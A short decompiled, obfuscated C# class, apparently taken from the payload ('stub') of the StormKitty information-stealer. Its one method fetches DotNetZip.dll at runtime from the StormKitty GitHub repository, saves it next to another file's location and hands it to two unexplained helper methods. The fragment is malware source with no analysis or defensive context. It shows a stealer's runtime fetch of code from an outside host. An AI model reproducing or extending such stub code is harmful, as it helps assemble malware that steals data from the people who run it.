using System;
using System.IO;
using System.Net;
using ns16;

namespace ns14;

internal sealed class Class65
{
	public static string string_0 = "https://raw.githubusercontent.com/LimerBoy/StormKitty/master/StormKitty/stub/packages/DotNetZip.1.13.8/lib/net40/DotNetZip.dll";

	public static bool smethod_0(string string_1)
	{
		string text = Path.Combine(Path.GetDirectoryName(Class77.string_1), Path.GetFileName(new Uri(string_1).LocalPath));
		if (!File.Exists(text))
		{
			try
			{
				using WebClient webClient = new WebClient();
				webClient.DownloadFile(string_1, text);
			}
			catch (WebException)
			{
				return false;
			}
			Class77.smethod_1(text);
			Class77.smethod_0(text);
		}
		return File.Exists(text);
	}
}
